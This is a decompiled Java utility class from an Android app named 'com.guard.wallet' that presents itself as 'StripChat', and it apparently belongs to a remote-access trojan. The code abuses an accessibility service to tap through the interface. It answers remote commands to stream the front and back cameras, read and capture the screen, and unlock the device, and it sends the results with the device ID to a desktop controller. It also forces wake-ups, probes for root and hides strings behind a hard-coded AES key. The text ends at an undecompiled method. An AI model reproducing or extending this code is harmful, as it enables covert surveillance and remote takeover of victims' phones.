package a1;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.BatteryManager;
import android.os.Bundle;
import android.os.PowerManager;
import android.os.Build.VERSION;
import android.os.PowerManager.WakeLock;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import com.google.json.reflect.TypeToken;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.CommandResult;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.msg.BridgeBody;
import com.guard.wallet.msg.BridgeBufferBody;
import com.guard.wallet.msg.BridgeBufferMessage;
import com.guard.wallet.msg.BridgeMessage;
import com.guard.wallet.req.BatteryLevelVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.CacheTaskVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.UnsupportedEncodingException;
import java.net.ServerSocket;
import java.nio.Buffer;
import java.nio.ByteBuffer;
import java.nio.channels.ByteChannel;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.concurrent.LinkedBlockingQueue;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.KeyManager;
import javax.net.ssl.SSLContext;
import javax.net.ssl.X509TrustManager;
import org.conscrypt.OpenSSLProvider;
import p0.x;

public abstract class q implements l0.o {
   public static p a;
   public static long b;
   public static com.guard.wallet.bridge.a c;
   public static com.guard.wallet.bridge.a d;
   public static com.guard.wallet.bridge.a e;
   public static com.guard.wallet.bridge.a f;
   public static com.guard.wallet.bridge.a g;
   public static final byte[] h = new byte[]{
      65,
      66,
      67,
      68,
      69,
      70,
      71,
      72,
      73,
      74,
      75,
      76,
      77,
      78,
      79,
      80,
      81,
      82,
      83,
      84,
      85,
      86,
      87,
      88,
      89,
      90,
      97,
      98,
      99,
      100,
      101,
      102,
      103,
      104,
      105,
      106,
      107,
      108,
      109,
      110,
      111,
      112,
      113,
      114,
      115,
      116,
      117,
      118,
      119,
      120,
      121,
      122,
      48,
      49,
      50,
      51,
      52,
      53,
      54,
      55,
      56,
      57,
      43,
      47
   };
   public static boolean i;
   public static SSLContext j;
   public static final int k = 0;
   public static final byte[] l = new byte[]{
      65,
      66,
      67,
      68,
      69,
      70,
      71,
      72,
      73,
      74,
      75,
      76,
      77,
      78,
      79,
      80,
      81,
      82,
      83,
      84,
      85,
      86,
      87,
      88,
      89,
      90,
      97,
      98,
      99,
      100,
      101,
      102,
      103,
      104,
      105,
      106,
      107,
      108,
      109,
      110,
      111,
      112,
      113,
      114,
      115,
      116,
      117,
      118,
      119,
      120,
      121,
      122,
      48,
      49,
      50,
      51,
      52,
      53,
      54,
      55,
      56,
      57,
      43,
      47
   };
   public static final byte[] m = new byte[]{
      65,
      66,
      67,
      68,
      69,
      70,
      71,
      72,
      73,
      74,
      75,
      76,
      77,
      78,
      79,
      80,
      81,
      82,
      83,
      84,
      85,
      86,
      87,
      88,
      89,
      90,
      97,
      98,
      99,
      100,
      101,
      102,
      103,
      104,
      105,
      106,
      107,
      108,
      109,
      110,
      111,
      112,
      113,
      114,
      115,
      116,
      117,
      118,
      119,
      120,
      121,
      122,
      48,
      49,
      50,
      51,
      52,
      53,
      54,
      55,
      56,
      57,
      45,
      95
   };
   public static final byte[] n = new byte[]{
      45,
      48,
      49,
      50,
      51,
      52,
      53,
      54,
      55,
      56,
      57,
      65,
      66,
      67,
      68,
      69,
      70,
      71,
      72,
      73,
      74,
      75,
      76,
      77,
      78,
      79,
      80,
      81,
      82,
      83,
      84,
      85,
      86,
      87,
      88,
      89,
      90,
      95,
      97,
      98,
      99,
      100,
      101,
      102,
      103,
      104,
      105,
      106,
      107,
      108,
      109,
      110,
      111,
      112,
      113,
      114,
      115,
      116,
      117,
      118,
      119,
      120,
      121,
      122
   };

   public static boolean A() {
      if (MyAccessibilityService.P() != null) {
         String var1 = MyAccessibilityService.P().S();
         if (!B(var1)) {
            return Objects.equals(var1, MyAccessibilityService.P().getPackageName());
         }
      }

      boolean var0;
      if (com.guard.wallet.utils.g.Z() != null) {
         var0 = com.guard.wallet.utils.g.s0(com.guard.wallet.utils.g.Z().getPackageName());
      } else {
         var0 = false;
      }

      return var0;
   }

   public static boolean B(Object var0) {
      boolean var1;
      if (var0 != null && !"".equals(var0)) {
         var1 = false;
      } else {
         var1 = true;
      }

      return var1;
   }

   public static boolean C() {
      String var0 = com.guard.wallet.utils.g.b0();
      return MyAccessibilityService.P() != null ? Objects.equals(MyAccessibilityService.P().S(), var0) : com.guard.wallet.utils.g.s0(var0);
   }

   public static boolean D(String var0) {
      if (B(var0)) {
         return false;
      } else {
         var0 = Q(var0);
         if (!var0.isEmpty()) {
            char[] var2 = var0.toCharArray();

            for (int var1 = 0; var1 < var2.length; var1++) {
               StringBuilder var4 = new StringBuilder();
               var4.append(var2[var1]);
               var4.append("");
               if (!"-0123456789.Ee".contains(var4.toString())) {
                  return false;
               }
            }
         }

         return true;
      }
   }

   public static boolean E(int var0) {
      ServerSocket var9;
      label45: {
         try {
            var9 = new ServerSocket(var0);
            break label45;
         } catch (IOException var7) {
            var2 = var7;
         } finally {
            ;
         }

         s("IpUtils", var2);
         return false;
      }

      try {
         var9.close();
      } catch (IOException var6) {
         s("IpUtils", var6);
      }

      return true;
   }

   public static void F(String var0) {
      if (!B(var0) && z()) {
         com.guard.wallet.bridge.a var3 = e;
         var3.getClass();
         if (!B(var0)) {
            String var2 = com.guard.wallet.utils.h.l("deviceId");
            if (!B(var2)) {
               BridgeBufferBody var1 = new BridgeBufferBody();
               var1.setBridgePath(var3.u);
               var1.setDeviceId(var2);
               var1.setToDesktop(Boolean.TRUE);
               var1.setBuffer(var0);
               var3.c(com.guard.wallet.utils.h.N(new BridgeBufferMessage(var1)));
            }
         }
      }
   }

   public static boolean G() {
      return !com.guard.wallet.utils.e.m() && !com.guard.wallet.utils.e.l() ? false : Settings.canDrawOverlays(com.guard.wallet.utils.g.Z()) ^ true;
   }

   public static String H() {
      Date var0 = new Date(System.currentTimeMillis());
      return new SimpleDateFormat("HH:mm:ss", Locale.CHINA).format(var0);
   }

   public static boolean I(String var0) {
      boolean var1;
      if (!var0.equals("GET") && !var0.equals("HEAD")) {
         var1 = true;
      } else {
         var1 = false;
      }

      return var1;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static Bitmap J(String var0) {
      Exception var10000;
      label48: {
         ByteArrayOutputStream var2;
         FileInputStream var3;
         try {
            var3 = new FileInputStream(var0);
            var2 = new ByteArrayOutputStream();
            var9 = new byte[1024];
         } catch (Exception var8) {
            var10000 = var8;
            boolean var10001 = false;
            break label48;
         }

         while (true) {
            int var1;
            try {
               var1 = var3.read(var9);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var13 = false;
               break;
            }

            if (var1 <= 0) {
               label36: {
                  try {
                     var2.flush();
                     byte[] var10 = var2.toByteArray();
                     if (var10.length > 0) {
                        var11 = BitmapFactory.decodeByteArray(var10, 0, var10.length, null);
                        break label36;
                     }
                  } catch (Exception var5) {
                     var10000 = var5;
                     boolean var15 = false;
                     break;
                  }

                  var11 = null;
               }

               try {
                  var2.close();
                  return var11;
               } catch (Exception var4) {
                  var10000 = var4;
                  boolean var16 = false;
                  break;
               }
            }

            try {
               var2.write(var9, 0, var1);
            } catch (Exception var7) {
               var10000 = var7;
               boolean var14 = false;
               break;
            }
         }
      }

      Exception var12 = var10000;
      s("FileUtils", var12);
      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static String K(String var0) {
      if (!B(var0)) {
         File var1 = new File(var0);
         if (var1.exists() && var1.isFile() && var1.canRead()) {
            StringBuilder var2 = new StringBuilder("文件存在,能读取:");
            var2.append(var0);
            Log.d("FileUtils", var2.toString());

            InputStreamReader var3;
            label94: {
               label84: {
                  label83: {
                     try {
                        var19 = new FileInputStream(var1);
                     } catch (IOException var14) {
                        var17 = var14;
                        var15 = null;
                        break label83;
                     }

                     try {
                        var3 = new InputStreamReader(var19);
                        break label84;
                     } catch (IOException var13) {
                        var17 = var13;
                        var15 = var19;
                     }
                  }

                  var3 = null;
                  Object var4 = null;
                  var19 = var15;
                  var16 = (BufferedReader)var4;
                  break label94;
               }

               try {
                  var16 = new BufferedReader(var3);
               } catch (IOException var12) {
                  var17 = var12;
                  var16 = null;
                  break label94;
               }

               IOException var10000;
               label72: {
                  try {
                     var18 = new StringBuilder();
                  } catch (IOException var11) {
                     var10000 = var11;
                     boolean var10001 = false;
                     break label72;
                  }

                  while (true) {
                     String var20;
                     try {
                        var20 = var16.readLine();
                     } catch (IOException var9) {
                        var10000 = var9;
                        boolean var21 = false;
                        break;
                     }

                     if (var20 == null) {
                        try {
                           var19.close();
                           var3.close();
                           var16.close();
                           return var18.toString();
                        } catch (IOException var8) {
                           var10000 = var8;
                           boolean var23 = false;
                           break;
                        }
                     }

                     try {
                        var18.append(var20);
                        var18.append('\n');
                     } catch (IOException var10) {
                        var10000 = var10;
                        boolean var22 = false;
                        break;
                     }
                  }
               }

               var17 = var10000;
            }

            s("FileUtils", var17);
            if (var19 != null) {
               try {
                  var19.close();
               } catch (IOException var7) {
                  s("FileUtils", var7);
               }
            }

            if (var3 != null) {
               try {
                  var3.close();
               } catch (IOException var6) {
                  s("FileUtils", var6);
               }
            }

            if (var16 != null) {
               try {
                  var16.close();
               } catch (IOException var5) {
                  s("FileUtils", var5);
               }
            }
         }
      }

      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void L(p var0) {
      if (var0.f != null || var0.g != null) {
         throw new IllegalArgumentException();
      } else if (!var0.d) {
         synchronized (q.class){} // $VF: monitorenter 

         Throwable var10000;
         label141: {
            long var1;
            try {
               var1 = b + 8192L;
            } catch (Throwable var22) {
               var10000 = var22;
               boolean var10001 = false;
               break label141;
            }

            if (var1 > 65536L) {
               label135:
               try {
                  // $VF: monitorexit
                  return;
               } catch (Throwable var20) {
                  var10000 = var20;
                  boolean var24 = false;
                  break label135;
               }
            } else {
               label137:
               try {
                  b = var1;
                  var0.f = a;
                  var0.c = 0;
                  var0.b = 0;
                  a = var0;
                  // $VF: monitorexit
                  return;
               } catch (Throwable var21) {
                  var10000 = var21;
                  boolean var25 = false;
                  break label137;
               }
            }
         }

         while (true) {
            Throwable var23 = var10000;

            try {
               // $VF: monitorexit
               throw var23;
            } catch (Throwable var19) {
               var10000 = var19;
               boolean var26 = false;
               continue;
            }
         }
      }
   }

   public static boolean M() {
      return com.guard.wallet.utils.g.p0() ? false : b();
   }

   public static void N(CacheTaskVO var0) {
      if (var0 != null && !B(var0.getReqUri())) {
         if (var0.getSocketStream()) {
            String var1 = com.guard.wallet.utils.h.l("deviceId");
            if (!B(var1)) {
               BridgeBody var2 = new BridgeBody();
               var2.setDeviceId(var1);
               var2.setBridgePath(var0.getReqUri());
               BridgeMessage var4 = new BridgeMessage(var2);
               k(var0.getReqUri(), var4);
            }
         }

         if (var0.getReqUri().equals("/unlock")) {
            ReqUnlockDeviceVO var3;
            if (!B(var0.getArguments())) {
               TypeToken var5 = TypeToken.get(ReqUnlockDeviceVO.class);
               var3 = (ReqUnlockDeviceVO)com.guard.wallet.utils.h.c(var0.getArguments(), var5);
            } else {
               var3 = null;
            }

            com.guard.wallet.utils.g.p1(var3);
         } else {
            if (Objects.equals(var0.getReqMethod(), 0)) {
               new com.guard.wallet.http.i("http://127.0.0.1:7910").d(com.guard.wallet.utils.h.M(var0.getArguments()), var0.getReqUri(), new j.e(3));
            }

            if (Objects.equals(var0.getReqMethod(), 1)) {
               new com.guard.wallet.http.i("http://127.0.0.1:7910").h(com.guard.wallet.utils.h.M(var0.getArguments()), var0.getReqUri(), new j.e(3));
            }
         }
      }
   }

   public static boolean O(String var0, String var1) {
      b();
      if (R()) {
         return true;
      } else {
         String var3 = var0;
         if (B(var0)) {
            var3 = var0;
            if (MainApplication.getAppContext() != null) {
               var3 = MainApplication.getAppContext().getPackageName();
            }
         }

         var0 = var1;
         if (B(var1)) {
            Integer var5 = com.guard.wallet.utils.d.a;
            if (MainApplication.getInstance() != null
               && MainApplication.getInstance().getBuildConfig() != null
               && !B(MainApplication.getInstance().getBuildConfig().getLauncherLabel())) {
               var0 = MainApplication.getInstance().getBuildConfig().getLauncherLabel();
            } else {
               var0 = "StripChat";
            }
         }

         if (!B(var3) && com.guard.wallet.utils.g.d1(var3, "") && R()) {
            return true;
         } else {
            if (MyAccessibilityService.P() != null && MyAccessibilityService.Q() != null) {
               if (!A()) {
                  var1 = com.guard.wallet.utils.g.b0();
                  if (!Objects.equals(MyAccessibilityService.P().S(), var1)) {
                     com.guard.wallet.utils.g.F0(2);
                  }
               }

               UiObject var9 = MyAccessibilityService.Q().findOneByOperateOr(o(var0));
               UiObject var11 = var9;
               if (var9 == null) {
                  com.guard.wallet.utils.g.F0(2);
                  int var2 = 0;

                  while (true) {
                     var11 = var9;
                     if (var9 != null) {
                        break;
                     }

                     var11 = var9;
                     if (var2 >= 5) {
                        break;
                     }

                     com.guard.wallet.utils.g.S(10L, 100L, new Point(300.0F, 200.0F), new Point(20.0F, 200.0F));
                     com.guard.wallet.utils.g.T0(5);
                     MyAccessibilityService.P().l0(false);
                     var9 = MyAccessibilityService.Q().findOneByOperateOr(o(var0));
                     var2++;
                  }
               }

               if (var11 != null) {
                  com.guard.wallet.utils.g.s((int)var11.centerInScreen().getX(), (int)var11.centerInScreen().getY());
                  if (R()) {
                     return true;
                  }

                  CombineFilter var10 = new CombineFilter();
                  var10.setBoolConditions(new LinkedList<>());
                  BoolCondition var6 = new BoolCondition("clickable", true, true);
                  var10.getBoolConditions().add(var6);
                  UiObject var7 = var11.findParentUtilCombine(var10);
                  if (var7 != null) {
                     com.guard.wallet.utils.g.s((int)var7.centerInScreen().getX(), (int)var7.centerInScreen().getY());
                     return R();
                  }
               }
            }

            return false;
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static p P() {
      synchronized (q.class){} // $VF: monitorenter 

      Throwable var10000;
      label121: {
         p var0;
         try {
            var0 = a;
         } catch (Throwable var20) {
            var10000 = var20;
            boolean var10001 = false;
            break label121;
         }

         if (var0 != null) {
            label114:
            try {
               a = var0.f;
               var0.f = null;
               b -= 8192L;
               // $VF: monitorexit
               return var0;
            } catch (Throwable var18) {
               var10000 = var18;
               boolean var22 = false;
               break label114;
            }
         } else {
            label117: {
               try {
                  // $VF: monitorexit
               } catch (Throwable var19) {
                  var10000 = var19;
                  boolean var23 = false;
                  break label117;
               }

               return new p();
            }
         }
      }

      while (true) {
         Throwable var21 = var10000;

         try {
            // $VF: monitorexit
            throw var21;
         } catch (Throwable var17) {
            var10000 = var17;
            boolean var24 = false;
            continue;
         }
      }
   }

   public static String Q(String var0) {
      return !B(var0) && !"null".equals(var0) ? var0.replaceAll("\\s*", "").replaceAll(" ", "").replaceAll(" ", "").replaceAll("^[　 ]+|[　 ]+$", "") : "";
   }

   public static boolean R() {
      boolean var1 = A();

      for (int var0 = 0; !var1 && var0 < 10; var1 = A()) {
         com.guard.wallet.utils.g.T0(1);
         var0++;
      }

      return var1;
   }

   public static boolean S() {
      if (com.guard.wallet.utils.e.j()) {
         return true;
      } else {
         boolean var0;
         Context var2 = com.guard.wallet.utils.g.Z();
         boolean var1 = false;
         var0 = var1;
         label42:
         if (var2 != null) {
            try {
               WakeLock var4 = ((PowerManager)com.guard.wallet.utils.g.Z().getSystemService("power")).newWakeLock(805306378, "WakeLockUtils");
               if (var4.isHeld()) {
                  var4.release();
               }

               var4.setReferenceCounted(false);
               var4.acquire(600000L);
            } catch (Exception var3) {
               s("WakeLockUtils", var3);
               var0 = var1;
               break label42;
            }

            var0 = true;
         }

         if (var0 && com.guard.wallet.utils.e.j()) {
            com.guard.wallet.utils.g.T0(2);
            if (com.guard.wallet.utils.e.j()) {
               return true;
            }
         }

         if (h.e.S() != null && h.e.S().D() && h.e.S().N("input keyevent KEYCODE_WAKEUP")) {
            com.guard.wallet.utils.g.T0(2);
            if (com.guard.wallet.utils.e.j()) {
               return true;
            }
         }

         return com.guard.wallet.utils.g.F0(2);
      }
   }

   public static void T(f0.k var0, byte[] var1, g0.a var2) {
      ByteBuffer var3 = f0.m.g(var1.length);
      var3.put(var1);
      ((Buffer)var3).flip();
      f0.m var4 = new f0.m();
      var4.a(var3);
      f0.t var5 = new f0.t(var0, var4, var2, 1);
      ((f0.b)var0).d(var5);
      var5.c();
   }

   public static boolean U(String var0, String var1) {
      if (!B(var0) && !B(var1)) {
         File var2 = new File(var0);
         if (var2.exists() && var2.isFile() && var2.canWrite()) {
            StringBuilder var3 = new StringBuilder("文件存在,能写入:");
            var3.append(var0);
            Log.d("FileUtils", var3.toString());

            try {
               FileOutputStream var5 = new FileOutputStream(var2, false);
               byte[] var6 = var1.getBytes();
               var5.write(var6, 0, var6.length);
               var5.flush();
               return true;
            } catch (Exception var4) {
               s("FileUtils", var4);
            }
         }
      }

      return false;
   }

   public static Bundle a(f.a... var0) {
      Bundle var3 = new Bundle();
      int var2 = var0.length;

      for (int var1 = 0; var1 < var2; var1++) {
         var0[var1].a(var3);
      }

      return var3;
   }

   public static boolean b() {
      while (true) {
         boolean var1 = R();
         boolean var0 = C();
         if (var1 || var0 || MyAccessibilityService.P() == null) {
            return var1;
         }

         com.guard.wallet.utils.g.F0(1);
      }
   }

   public static boolean c(e1.d var0, ByteChannel var1) {
      LinkedBlockingQueue var5 = var0.a;
      ByteBuffer var4 = (ByteBuffer)var5.peek();
      ByteBuffer var3 = var4;
      if (var4 != null) {
         do {
            var1.write(var3);
            if (var3.remaining() > 0) {
               return false;
            }

            var5.poll();
            var4 = (ByteBuffer)var5.peek();
            var3 = var4;
         } while (var4 != null);
      }

      if (var5.isEmpty() && var0.g) {
         g1.b var6 = var0.j;
         if (var6 != null) {
            int var2 = var6.a;
            if (var2 != 0 && var2 == 2) {
               if (var0.p == null) {
                  throw new IllegalStateException("this method must be used in conjunction with flushAndClose");
               }

               var2 = var0.o;
               var0.k(var0.n, var0.p, var2);
            }
         }
      }

      return true;
   }

   public static BatteryLevelVO d() {
      if (com.guard.wallet.utils.g.Z() != null) {
         BatteryManager var1 = (BatteryManager)com.guard.wallet.utils.g.Z().getSystemService("batterymanager");
         StringBuilder var2 = new StringBuilder("BATTERY_PROPERTY_CAPACITY:");
         var2.append(var1.getIntProperty(4));
         Log.d("BatteryUtils", var2.toString());
         float var0 = (float)((double)var1.getIntProperty(4) / 100.0);
         if (VERSION.SDK_INT > 26) {
            com.guard.wallet.utils.h.D(var1.getIntProperty(6), "batteryStatus");
         }

         com.guard.wallet.utils.h.D(var0, "batteryPercent");
      }

      BatteryLevelVO var3 = new BatteryLevelVO();
      var3.setStatus(com.guard.wallet.utils.h.i("batteryStatus"));
      var3.setPercent(com.guard.wallet.utils.h.h());
      var3.setHealth(com.guard.wallet.utils.h.i("batteryHealth"));
      var3.setTemperature(com.guard.wallet.utils.h.i("batteryTemperature"));
      var3.setVoltage(com.guard.wallet.utils.h.i("batteryVoltage"));
      return var3;
   }

   public static boolean e() {
      int var1 = com.guard.wallet.utils.h.i("isRoot");
      boolean var2 = false;
      int var0 = var1;
      if (var1 != 0) {
         var0 = var1;
         if (var1 != 1) {
            if (u(new String[]{"echo root"}, true, false).getResult() == 0) {
               var0 = 1;
            } else {
               var0 = 0;
            }

            com.guard.wallet.utils.h.D(var0, "isRoot");
         }
      }

      if (var0 == 1) {
         var2 = true;
      }

      return var2;
   }

   public static void g(String var0) {
      if (!B(var0)) {
         var0.getClass();
         int var2 = var0.hashCode();
         byte var1 = -1;
         switch (var2) {
            case -1979810841:
               if (var0.equals("/backCameraLive")) {
                  var1 = 0;
               }
               break;
            case -1199797032:
               if (var0.equals("/cacheTask")) {
                  var1 = 1;
               }
               break;
            case -73571157:
               if (var0.equals("/frontCameraLive")) {
                  var1 = 2;
               }
               break;
            case 926732049:
               if (var0.equals("/readScreen")) {
                  var1 = 3;
               }
               break;
            case 1372235020:
               if (var0.equals("/minicap")) {
                  var1 = 4;
               }
         }

         switch (var1) {
            case 0:
               com.guard.wallet.bridge.a var7 = g;
               if (var7 != null) {
                  var7.t();
                  g = null;
               }
               break;
            case 1:
               com.guard.wallet.bridge.a var6 = c;
               if (var6 != null) {
                  var6.t();
                  c = null;
               }
               break;
            case 2:
               com.guard.wallet.bridge.a var5 = f;
               if (var5 != null) {
                  var5.t();
                  f = null;
               }
               break;
            case 3:
               com.guard.wallet.bridge.a var4 = e;
               if (var4 != null) {
                  var4.t();
                  e = null;
               }
               break;
            case 4:
               com.guard.wallet.bridge.a var3 = d;
               if (var3 != null) {
                  var3.t();
                  d = null;
               }
         }
      }
   }

   public static void h(Closeable... var0) {
      for (Closeable var3 : var0) {
         if (var3 != null) {
            try {
               var3.close();
            } catch (Exception var4) {
            }
         }
      }
   }

   public static void k(String var0, BridgeMessage var1) {
      if (!B(var0)) {
         var0.getClass();
         int var3 = var0.hashCode();
         byte var2 = -1;
         switch (var3) {
            case -1979810841:
               if (var0.equals("/backCameraLive")) {
                  var2 = 0;
               }
               break;
            case -1199797032:
               if (var0.equals("/cacheTask")) {
                  var2 = 1;
               }
               break;
            case -73571157:
               if (var0.equals("/frontCameraLive")) {
                  var2 = 2;
               }
               break;
            case 926732049:
               if (var0.equals("/readScreen")) {
                  var2 = 3;
               }
               break;
            case 1372235020:
               if (var0.equals("/minicap")) {
                  var2 = 4;
               }
         }

         com.guard.wallet.bridge.a var4;
         switch (var2) {
            case 0:
               if (g == null) {
                  g("/minicap");
                  g("/frontCameraLive");
                  com.guard.wallet.bridge.a var7 = new com.guard.wallet.bridge.a(var0, var1);
                  g = var7;
                  var7.u();
                  m.d var8 = m.d.c();
                  var8.d(0);
                  if (var8.c == null) {
                     var8.a(1);
                     return;
                  }
               }

               return;
            case 1:
               if (c != null) {
                  return;
               }

               var4 = new com.guard.wallet.bridge.a(var0, var1);
               c = var4;
               break;
            case 2:
               if (f == null) {
                  g("/minicap");
                  g("/backCameraLive");
                  com.guard.wallet.bridge.a var5 = new com.guard.wallet.bridge.a(var0, var1);
                  f = var5;
                  var5.u();
                  m.d var6 = m.d.c();
                  var6.d(1);
                  if (var6.c == null) {
                     var6.a(0);
                     return;
                  }
               }

               return;
            case 3:
               if (e != null) {
                  return;
               }

               var4 = new com.guard.wallet.bridge.a(var0, var1);
               e = var4;
               break;
            case 4:
               if (d == null) {
                  g("/frontCameraLive");
                  g("/backCameraLive");
                  var4 = new com.guard.wallet.bridge.a(var0, var1);
                  d = var4;
                  break;
               }

               return;
            default:
               return;
         }

         var4.u();
      }
   }

   public static boolean l(String var0) {
      if (!B(var0)) {
         File var2 = new File(var0);
         if (var2.exists() && var2.delete()) {
            StringBuilder var1 = new StringBuilder("文件存在,删除成功:");
            var1.append(var0);
            Log.d("FileUtils", var1.toString());
         }

         try {
            if (var2.createNewFile()) {
               StringBuilder var5 = new StringBuilder("文件创建成功:");
               var5.append(var0);
               Log.d("FileUtils", var5.toString());
               return true;
            }
         } catch (IOException var3) {
            s("FileUtils", var3);
         }
      }

      StringBuilder var4 = new StringBuilder("文件创建失败:");
      var4.append(var0);
      Log.e("FileUtils", var4.toString());
      return false;
   }

   public static String m(String var0) {
      try {
         byte[] var1 = Base64.decode(var0, 16);
         Cipher var4 = Cipher.getInstance("AES/ECB/PKCS5Padding");
         SecretKeySpec var2 = new SecretKeySpec("****1qaz2wsx****".getBytes(), "AES");
         var4.init(2, var2);
         return new String(var4.doFinal(var1));
      } catch (Exception var3) {
         s("AESUtils", var3);
         return null;
      }
   }

   public static boolean n(String var0) {
      File var1 = new File(var0);
      return var1.exists() ? var1.delete() : false;
   }

   public static CombineFiltersWithOr o(String var0) {
      CombineFiltersWithOr var2 = new CombineFiltersWithOr(new LinkedList<>());
      List var3 = var2.getFilters();
      String var1;
      if (B(var0)) {
         var1 = com.guard.wallet.utils.g.x0();
      } else {
         var1 = var0;
      }

      CombineFilter var4 = new CombineFilter();
      var4.setStringConditions(new LinkedList<>());
      var4.setBoolConditions(new LinkedList<>());
      StringCondition var5 = new StringCondition();
      var5.setProperty("text");
      var5.setEquals(var1);
      var4.getStringConditions().add(var5);
      BoolCondition var7 = new BoolCondition("visibleToUser", true, true);
      var4.getBoolConditions().add(var7);
      var3.add(var4);
      var3 = var2.getFilters();
      var1 = var0;
      if (B(var0)) {
         var1 = com.guard.wallet.utils.g.x0();
      }

      CombineFilter var6 = new CombineFilter();
      var6.setStringConditions(new LinkedList<>());
      var6.setBoolConditions(new LinkedList<>());
      StringCondition var11 = new StringCondition();
      var11.setProperty("desc");
      var11.setEquals(var1);
      var6.getStringConditions().add(var11);
      BoolCondition var9 = new BoolCondition("visibleToUser", true, true);
      var6.getBoolConditions().add(var9);
      var3.add(var6);
      return var2;
   }

   public static void p(f0.o var0, f0.m var1) {
      g0.b var3 = null;

      while (!var0.e()) {
         g0.b var4 = var0.k();
         var3 = var4;
         if (var4 == null) {
            break;
         }

         int var2 = var1.c;
         var3 = var4;
         if (var2 <= 0) {
            break;
         }

         var4.b(var0, var1);
         var3 = var4;
         if (var2 == var1.c) {
            var3 = var4;
            if (var4 == var0.k()) {
               if (!var0.e()) {
                  PrintStream var6 = System.out;
                  StringBuilder var7 = new StringBuilder("handler: ");
                  var7.append(var4);
                  var6.println(var7.toString());
                  var1.k();
                  throw new RuntimeException("mDataHandler failed to consume data, yet remains the mDataHandler.");
               }

               var3 = var4;
            }
         }
      }

      if (var1.c != 0 && !var0.e()) {
         PrintStream var5 = System.out;
         StringBuilder var9 = new StringBuilder("handler: ");
         var9.append(var3);
         var5.println(var9.toString());
         PrintStream var8 = System.out;
         var9 = new StringBuilder("emitter: ");
         var9.append(var0);
         var8.println(var9.toString());
         var1.k();
      }
   }

   public static void q(byte[] var0, int var1, int var2, byte[] var3, int var4, int var5) {
      byte[] var8;
      if ((var5 & 16) == 16) {
         var8 = m;
      } else if ((var5 & 32) == 32) {
         var8 = n;
      } else {
         var8 = l;
      }

      int var7 = 0;
      if (var2 > 0) {
         var5 = var0[var1] << 24 >>> 8;
      } else {
         var5 = 0;
      }

      int var6;
      if (var2 > 1) {
         var6 = var0[var1 + 1] << 24 >>> 16;
      } else {
         var6 = 0;
      }

      if (var2 > 2) {
         var7 = var0[var1 + 2] << 24 >>> 24;
      }

      var1 = var6 | var5 | var7;
      if (var2 != 1) {
         if (var2 != 2) {
            if (var2 == 3) {
               var3[var4] = var8[var1 >>> 18];
               var3[var4 + 1] = var8[var1 >>> 12 & 63];
               var3[var4 + 2] = var8[var1 >>> 6 & 63];
               var3[var4 + 3] = var8[var1 & 63];
            }
         } else {
            var3[var4] = var8[var1 >>> 18];
            var3[var4 + 1] = var8[var1 >>> 12 & 63];
            var3[var4 + 2] = var8[var1 >>> 6 & 63];
            var3[var4 + 3] = 61;
         }
      } else {
         var3[var4] = var8[var1 >>> 18];
         var3[var4 + 1] = var8[var1 >>> 12 & 63];
         var3[var4 + 2] = 61;
         var3[var4 + 3] = 61;
      }
   }

   public static String r(int var0, byte[] var1) {
      if (var1 == null) {
         throw new IllegalArgumentException("Cannot serialize a null array.");
      } else if (var0 < 0) {
         throw new IllegalArgumentException(a.a.g("Cannot have length offset: ", var0));
      } else if (var0 + 0 > var1.length) {
         throw new IllegalArgumentException(String.format("Cannot have offset of %d and length of %d with array of length %d", 0, var0, var1.length));
      } else {
         int var3 = var0 / 3;
         byte var2 = 4;
         if (var0 % 3 <= 0) {
            var2 = 0;
         }

         int var5 = var3 * 4 + var2;
         byte[] var6 = new byte[var5];
         byte var10 = 0;

         for (var2 = 0; var10 < var0 - 2; var2 += 4) {
            q(var1, var10 + 0, 3, var6, var2, 0);
            var10 += 3;
         }

         int var4 = var2;
         if (var10 < var0) {
            q(var1, var10 + 0, var0 - var10, var6, var2, 0);
            var4 = var2 + 4;
         }

         var1 = var6;
         if (var4 <= var5 - 1) {
            var1 = new byte[var4];
            System.arraycopy(var6, 0, var1, 0, var4);
         }

         try {
            return new String(var1, "US-ASCII");
         } catch (UnsupportedEncodingException var7) {
            return new String(var1);
         }
      }
   }

   public static void s(String var0, Exception var1) {
      String var2;
      if (!B(var1.getMessage())) {
         var2 = var1.getMessage();
      } else if (var1.getCause() != null) {
         var2 = var1.getCause().toString();
      } else {
         var2 = Arrays.toString((Object[])var1.getStackTrace());
      }

      Log.e(var0, var2);
   }

   public static void t(String var0, Throwable var1) {
      String var2;
      if (!B(var1.getMessage())) {
         var2 = var1.getMessage();
      } else {
         var2 = Arrays.toString((Object[])var1.getStackTrace());
      }

      Log.e(var0, var2);
   }

   public static CommandResult u(String[] param0, boolean param1, boolean param2) {
      // $VF: Couldn't be decompiled
